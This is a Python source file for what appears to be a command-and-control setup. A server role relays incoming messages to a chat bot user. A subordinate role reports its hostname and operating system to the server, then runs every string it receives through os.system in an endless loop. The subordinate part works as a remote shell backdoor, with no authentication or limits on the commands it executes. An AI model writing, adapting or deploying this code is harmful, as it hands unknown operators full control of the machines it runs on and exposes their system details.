from configs import ROLE
from Server.twm import TellWithMe as SeTWM
from Subord.twm import TellWithMe as SuTWM
import os, subprocess, socket, platform, time

if ROLE == "Server":
    from configs import MAIN_USER_ID
    from Server.main import bot
    twm = SeTWM()
    subprocess.Popen(["python3", "Server/main.py"])
    while True:
        receive, flag = twm.receive()
        bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}")
        time.sleep(3.5)
        
         
else:
    twm = SuTWM()
    twm.send(twm.compileCommand("IND", {"name": socket.gethostname(), "os": platform.platform()}), "0.0.0", "IND", "Hi Server! Can you give me an address?")
    while True:
        receive, flag = twm.receive()
        os.system(receive)
        time.sleep(3.5)